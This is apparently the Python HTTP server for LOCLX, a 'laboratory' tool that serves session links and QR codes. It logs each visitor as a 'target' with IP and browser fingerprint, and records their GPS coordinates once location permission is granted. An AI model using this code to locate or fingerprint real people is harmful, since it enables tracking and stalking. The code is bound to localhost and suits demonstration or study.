"""HTTP API Server and Static Web Asset Server for LOCLX v2.2.0."""

from __future__ import annotations

import json
import os
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any, Optional

from loclx import VERSION
from loclx.dashboard import generate_compact_information_report, generate_target_report
from loclx.diagnostics import DiagnosticRunner
from loclx.ipinfo import IPManager
from loclx.qrcode import generate_ascii_qr
from loclx.security import (
    MAX_REQUEST_BODY,
    RateLimiter,
    sanitize_input,
    validate_gps_payload,
    validate_sid_format,
)
from loclx.sessions import Session, SessionManager
from loclx.utils import Ansi, emit, format_distance, format_uptime

BIND_ADDR = "127.0.0.1"
DEFAULT_PORT = 8765

_session_manager = SessionManager()
_ip_manager = IPManager()
_rate_limiter = RateLimiter(max_requests=100, window_seconds=60.0)
_active_session: Optional[Session] = None
_server_instance: Optional[ThreadingHTTPServer] = None
_web_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "web"))


def get_session_manager() -> SessionManager:
    return _session_manager


def get_active_session() -> Session:
    global _active_session
    if _active_session is None or _active_session.is_expired():
        _active_session = _session_manager.create_session()
    return _active_session


class LabHandler(BaseHTTPRequestHandler):
    """Custom HTTP request handler for LOCLX API and web laboratory."""

    def log_message(self, format: str, *args: Any) -> None:
        pass  # Suppress default HTTP server noise in CLI output

    def send_cors_headers(self) -> None:
        self.send_header("Access-Control-Allow-Origin", f"http://{BIND_ADDR}")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "SAMEORIGIN")
        self.send_header("Referrer-Policy", "strict-origin-when-cross-origin")
        self.send_header("Cache-Control", "no-store, max-age=0")
        self.send_header("Content-Security-Policy", "default-src 'self' 'unsafe-inline' https://*.tile.openstreetmap.org https://unpkg.com; img-src 'self' data: https://*.tile.openstreetmap.org; style-src 'self' 'unsafe-inline' https://unpkg.com; script-src 'self' 'unsafe-inline' https://unpkg.com;")

    def send_json(self, status_code: int, data: Any) -> None:
        body = json.dumps(data).encode("utf-8")
        self.send_response(status_code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_cors_headers()
        self.end_headers()
        self.wfile.write(body)

    def serve_file(self, filename: str, content_type: str) -> None:
        filepath = os.path.join(_web_dir, filename)
        if os.path.isfile(filepath):
            with open(filepath, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(content)))
            self.send_cors_headers()
            self.end_headers()
            self.wfile.write(content)
        else:
            self.send_error(404, "File not found")

    def resolve_session(self, sid: str) -> tuple[Optional[Session], int, str]:
        """Strict session resolution by ID. Returns (session, status_code, error_message)."""
        if not validate_sid_format(sid):
            return None, 400, "Invalid session ID format"

        session = _session_manager.sessions.get(sid)
        if not session:
            return None, 404, "Session not found"

        if session.status == "STOPPED":
            return session, 409, "Session stopped"

        if session.is_expired():
            return session, 410, "Session expired"

        return session, 200, "OK"

    def do_OPTIONS(self) -> None:
        self.send_response(204)
        self.send_cors_headers()
        self.end_headers()

    def do_GET(self) -> None:
        client_ip = self.client_address[0]
        if not _rate_limiter.is_allowed(client_ip):
            self.send_json(429, {"error": "Rate limit exceeded"})
            return

        url_path = self.path.split("?")[0]

        if url_path == "/" or url_path == "/index.html":
            session = get_active_session()
            self._notify_connection(session, client_ip)
            self.serve_file("index.html", "text/html; charset=utf-8")

        elif url_path.startswith("/session/"):
            parts = url_path.strip("/").split("/")
            if len(parts) >= 2 and parts[1]:
                sid = parts[1]
                session, code, msg = self.resolve_session(sid)
                if not session or code not in (200, 409):
                    self.send_json(code, {"error": msg})
                    return
                self._notify_connection(session, client_ip)
                self.serve_file("index.html", "text/html; charset=utf-8")
            else:
                self.send_json(400, {"error": "Session ID required"})

        elif url_path.startswith("/dashboard"):
            parts = url_path.strip("/").split("/")
            if len(parts) >= 2 and parts[1] and parts[1] != "dashboard.html":
                sid = parts[1]
                session, code, msg = self.resolve_session(sid)
                if not session:
                    self.send_json(code, {"error": msg})
                    return
            self.serve_file("dashboard.html", "text/html; charset=utf-8")

        elif url_path == "/app.js":
            self.serve_file("app.js", "application/javascript; charset=utf-8")
        elif url_path == "/dashboard.js":
            self.serve_file("dashboard.js", "application/javascript; charset=utf-8")
        elif url_path == "/style.css":
            self.serve_file("style.css", "text/css; charset=utf-8")

        elif url_path == "/api/session/active":
            session = get_active_session()
            self.send_json(200, session.to_dict())

        elif url_path == "/api/session/active/history":
            session = get_active_session()
            self.send_json(200, session.storage.get_history())

        elif url_path.startswith("/api/session/active/export"):
            session = get_active_session()
            fmt = self.path.split("format=")[-1] if "format=" in self.path else "json"
            if fmt == "csv":
                csv_data = session.storage.export_csv().encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/csv")
                self.send_header("Content-Length", str(len(csv_data)))
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(csv_data)
            else:
                self.send_json(200, session.storage.get_history())

        elif url_path == "/api/diagnostics":
            runner = DiagnosticRunner()
            diag = [{"category": c, "item": i, "status": s, "details": d} for c, i, s, d in runner.run_all()]
            self.send_json(200, diag)

        elif url_path == "/api/config":
            self.send_json(200, {
                "version": VERSION,
                "bind_addr": BIND_ADDR,
                "port": self.server.server_address[1],
                "session_ttl": _session_manager.default_timeout,
                "ip_provider": "auto",
            })

        elif url_path.startswith("/api/session/"):
            parts = url_path.strip("/").split("/")
            if len(parts) >= 3 and parts[2]:
                sid = parts[2]
                session, code, msg = self.resolve_session(sid)
                if not session:
                    self.send_json(code, {"error": msg})
                    return

                action = parts[3] if len(parts) >= 4 else None

                if action == "history":
                    self.send_json(200, session.storage.get_history())
                elif action == "report":
                    report = generate_target_report(session, Ansi(False))
                    self.send_response(200)
                    self.send_header("Content-Type", "text/plain; charset=utf-8")
                    self.send_header("Content-Length", str(len(report.encode("utf-8"))))
                    self.send_cors_headers()
                    self.end_headers()
                    self.wfile.write(report.encode("utf-8"))
                elif action == "qr":
                    sess_url = f"http://{BIND_ADDR}:{self.server.server_address[1]}/session/{session.sid}"
                    qr = generate_ascii_qr(sess_url)
                    self.send_json(200, {"id": session.sid, "url": sess_url, "qr": qr})
                elif action == "export":
                    fmt = self.path.split("format=")[-1] if "format=" in self.path else "json"
                    if fmt == "csv":
                        csv_data = session.storage.export_csv().encode("utf-8")
                        self.send_response(200)
                        self.send_header("Content-Type", "text/csv")
                        self.send_header("Content-Length", str(len(csv_data)))
                        self.send_cors_headers()
                        self.end_headers()
                        self.wfile.write(csv_data)
                    else:
                        self.send_json(200, session.storage.get_history())
                elif action is None:
                    self.send_json(200, session.to_dict())
                else:
                    self.send_json(400, {"error": "Invalid action endpoint"})
            else:
                self.send_json(400, {"error": "Invalid endpoint"})
        else:
            self.send_error(404, "Not Found")

    def do_POST(self) -> None:
        client_ip = self.client_address[0]
        if not _rate_limiter.is_allowed(client_ip):
            self.send_json(429, {"error": "Rate limit exceeded"})
            return

        content_length = int(self.headers.get("Content-Length", 0))
        if content_length > MAX_REQUEST_BODY:
            self.send_json(413, {"error": "Payload too large"})
            return

        body = self.rfile.read(content_length)
        try:
            payload = json.loads(body.decode("utf-8")) if body else {}
        except Exception:
            self.send_json(400, {"error": "Invalid JSON"})
            return

        url_path = self.path.split("?")[0]

        if url_path == "/report" or url_path == "/api/session/location":
            session = get_active_session()
            self._handle_location_update(session, payload, client_ip)
            self.send_json(200, {"status": "ok", "sessionId": session.sid})

        elif url_path == "/api/session":
            session = _session_manager.create_session()
            self.send_json(201, session.to_dict())

        elif url_path.startswith("/api/session/"):
            parts = url_path.strip("/").split("/")
            if len(parts) >= 3 and parts[2]:
                sid = parts[2]
                session, code, msg = self.resolve_session(sid)
                if not session:
                    self.send_json(code, {"error": msg})
                    return

                if code != 200:
                    self.send_json(code, {"error": msg})
                    return

                action = parts[3] if len(parts) >= 4 else None

                if action == "location":
                    gps_data = payload.get("gps")
                    if gps_data and not validate_gps_payload(gps_data):
                        self.send_json(400, {"error": "Invalid GPS data payload"})
                        return
                    self._handle_location_update(session, payload, client_ip)
                    self.send_json(200, {"status": "ok", "sessionId": session.sid})
                elif action == "stop":
                    session.stop()
                    emit(Ansi(True).amber(f"\n[-] Session stopped: {session.sid}\n"))
                    self.send_json(200, {"status": "stopped", "sessionId": session.sid})
                else:
                    self.send_json(400, {"error": "Invalid action endpoint"})
            else:
                self.send_json(400, {"error": "Invalid endpoint"})
        else:
            self.send_error(404, "Not Found")

    def do_DELETE(self) -> None:
        client_ip = self.client_address[0]
        if not _rate_limiter.is_allowed(client_ip):
            self.send_json(429, {"error": "Rate limit exceeded"})
            return

        url_path = self.path.split("?")[0]
        if url_path == "/api/session/active":
            session = get_active_session()
            session.storage.clear_history()
            self.send_json(200, {"status": "history cleared", "sessionId": session.sid})
        elif url_path.startswith("/api/session/"):
            parts = url_path.strip("/").split("/")
            if len(parts) == 3 and parts[2]:
                sid = parts[2]
                if not validate_sid_format(sid):
                    self.send_json(400, {"error": "Invalid session ID format"})
                    return
                if _session_manager.delete_session(sid):
                    self.send_json(200, {"status": "deleted", "sessionId": sid})
                else:
                    self.send_json(404, {"error": "Session not found"})
            else:
                self.send_json(400, {"error": "Invalid endpoint"})
        else:
            self.send_error(404, "Not Found")

    def _notify_connection(self, session: Session, client_ip: str) -> None:
        if not session.connected:
            session.mark_connected(client_ip)
            c = Ansi(True)
            t = time.strftime("%H:%M:%S")
            sep = "----------------------------------------"
            header_sep = "========================================================"

            b = session.browser_info.to_dict() if session.browser_info else {}

            emit(c.green("\n[+] TARGET CONNECTED\n"))
            emit(c.cyan(header_sep))
            emit(c.bold(c.cyan("              LOCLX TARGET INFORMATION")))
            emit(c.cyan(header_sep))
            emit("\nTarget connected successfully.\n")
            emit(c.bold(c.cyan("NETWORK")))
            emit(c.dim(sep))
            emit(f"IP Address       : {client_ip}")
            emit(f"Connection       : HTTP / HTTPS\n")
            emit(c.bold(c.cyan("DEVICE / BROWSER")))
            emit(c.dim(sep))
            emit(f"Browser          : {b.get('browser') or '—'}")
            emit(f"Version          : {b.get('browserVersion') or '—'}")
            emit(f"Platform         : {b.get('platform') or '—'}")
            emit(f"User Agent       : {b.get('userAgent') or '—'}")
            emit(f"Language         : {b.get('language') or '—'}")
            emit(f"Timezone         : {b.get('timezone') or '—'}")
            emit(f"Screen           : {b.get('screenResolution') or '—'}")
            emit(f"Viewport         : {b.get('viewportSize') or '—'}")
            emit(f"CPU Cores        : {b.get('cpuCores') or '—'}")
            emit(f"Device Pixel Ratio: {b.get('devicePixelRatio') or '1'}")
            emit(f"Touch Support    : {b.get('touchSupport') or '—'}")
            emit(f"Device Type      : {b.get('deviceType') or 'Desktop'}\n")
            emit(c.amber("[*] Requesting browser location permission...\n"))

    def _handle_location_update(self, session: Session, payload: dict[str, Any], client_ip: str) -> None:
        if not session.connected:
            session.mark_connected(client_ip)

        gps_data = payload.get("gps")
        ip_data = payload.get("ip")
        browser_data = payload.get("browser")
        denied = payload.get("denied", False)

        if isinstance(ip_data, dict):
            session.set_ip_info(ip_data)
        elif session.ip_info is None:
            fetched_ip = _ip_manager.fetch_ip_info()
            if fetched_ip:
                session.set_ip_info(fetched_ip)

        if isinstance(browser_data, dict):
            session.set_browser_info(browser_data)

        c = Ansi(True)

        if denied:
            emit(c.red("\n[-] Location permission denied."))
            emit(c.dim("[*] Browser/device information may still be available.\n"))
            return

        if isinstance(gps_data, dict) and "lat" in gps_data and "lon" in gps_data:
            if validate_gps_payload(gps_data):
                is_first_gps = (session.gps_updates == 0)
                session.update_gps(gps_data)

                if is_first_gps:
                    fix = session.current_fix
                    lat = fix["lat"]
                    lon = fix["lon"]
                    lat_lon_9 = f"{lat:.9f},{lon:.9f}"
                    lat_6 = f"{lat:.6f}"
                    lon_6 = f"{lon:.6f}"

                    emit(c.green("\n[+] GPS LOCATION RECEIVED\n"))
                    emit(f"Latitude         : {lat:.9f}")
                    emit(f"Longitude        : {lon:.9f}")
                    emit(f"Accuracy         : {fix.get('accuracy') or 0:.0f} m")
                    emit(f"Altitude         : {fix.get('altitude') or 'n/a'}")
                    emit(f"Speed            : {fix.get('speed') or 0:.1f}")
                    emit(f"Heading          : {fix.get('heading') or 0:.0f}")
                    emit(f"Timestamp        : {fix.get('timestamp') or '—'}\n")
                    emit(c.dim("GPS = browser-reported location obtained after explicit permission.\n"))
                    emit(c.bold(c.cyan("MAP LOCATION")))
                    emit(c.dim("----------------------------------------\n"))
                    emit("Google Maps:")
                    emit(f"https://www.google.com/maps?q={lat_lon_9}\n")
                    emit("Google Earth:")
                    emit(f"https://earth.google.com/web/search/{lat_lon_9}\n")
                    emit("OpenStreetMap:")
                    emit(f"https://www.openstreetmap.org/?mlat={lat_6}&mlon={lon_6}\n")

                    emit("\n" + generate_compact_information_report(session, c) + "\n")
                else:
                    fix = session.current_fix
                    emit(c.green(f"\n[+] GPS UPDATE"))
                    emit(f"    Latitude : {fix['lat']:.9f}")
                    emit(f"    Longitude: {fix['lon']:.9f}")
                    emit(f"    Accuracy : ±{fix.get('accuracy') or 0:.0f} m")
                    emit(f"    Time     : {fix.get('timestamp') or '—'}\n")


def bind_server(preferred_port: int = DEFAULT_PORT) -> ThreadingHTTPServer:
    """Bind HTTP server to BIND_ADDR on preferred_port or fallback ports."""
    tried = []
    candidates = [preferred_port]
    if preferred_port + 1 <= 65535:
        candidates.append(preferred_port + 1)
    if preferred_port + 2 <= 65535:
        candidates.append(preferred_port + 2)
    candidates.append(0)

    last_err: Optional[BaseException] = None
    for port in candidates:
        if port in tried:
            continue
        tried.append(port)
        try:
            return ThreadingHTTPServer((BIND_ADDR, port), LabHandler)
        except OSError as exc:
            last_err = exc
            continue

    if last_err:
        raise last_err
    raise OSError("Could not bind HTTP server")


def start_server_background(port: int = DEFAULT_PORT) -> tuple[ThreadingHTTPServer, str]:
    global _server_instance
    httpd = bind_server(port)
    _server_instance = httpd
    bound_port = httpd.server_address[1]
    url = f"http://{BIND_ADDR}:{bound_port}/"

    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    return httpd, url


def shutdown_server() -> None:
    global _server_instance
    if _server_instance is None:
        return
    server = _server_instance
    _server_instance = None

    def _stop() -> None:
        try:
            server.shutdown()
        except Exception:
            pass

    threading.Thread(target=_stop, daemon=True).start()
    try:
        server.server_close()
    except Exception:
        pass
